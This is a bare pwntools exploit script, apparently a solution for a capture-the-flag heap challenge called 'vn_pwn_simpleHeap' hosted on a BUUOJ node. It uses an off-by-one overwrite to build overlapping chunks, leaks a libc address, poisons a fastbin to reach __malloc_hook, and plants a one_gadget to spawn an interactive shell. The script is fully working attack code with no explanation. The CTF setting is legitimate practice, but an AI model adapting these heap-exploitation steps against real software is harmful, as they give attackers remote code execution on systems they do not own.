# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './vn_pwn_simpleHeap'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'node3.buuoj.cn'
port = '28202'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)

def add(s, c):
    sla(":", "1")
    sla("?", str(s))
    sea(":", c)

def edit(s, c):
    sla(":", "2")
    sla("?", str(s))
    sea(":", c)

def show(s):
    sla(":", "3")
    sla("?", str(s))

def dele(s):
    sla(":", "4")
    sla("?", str(s))

add(0x48, '0')
add(0x48, '1')
add(0x48, '2')
add(0x68, '3')
add(0x68, '4')
add(0x68, '5')

edit(0, 'a' * 0x48 + '\xa1')
dele(1)
add(0x48, '1')
add(0x48, '6')
show(2)
libc.address = un64(rn(6)) -0x3c4b78 +0x42
log.success(hex(libc.address))
edit(2, 'a' * 0x48 + '\xe1')

dele(3)
add(0x68, '3')
add(0x68, '7')
dele(4)
edit(7, p64(libc.address +0x3c4aed) + '\n')
add(0x68, '4')
one=libc.address +0xf1147
add(0x68, 'a' * 0xb + p64(one) + p64(libc.address + 0x846d4))
dbg("b*"+hex(one))
sla(":", "1")
sla("?", str(1))
shell()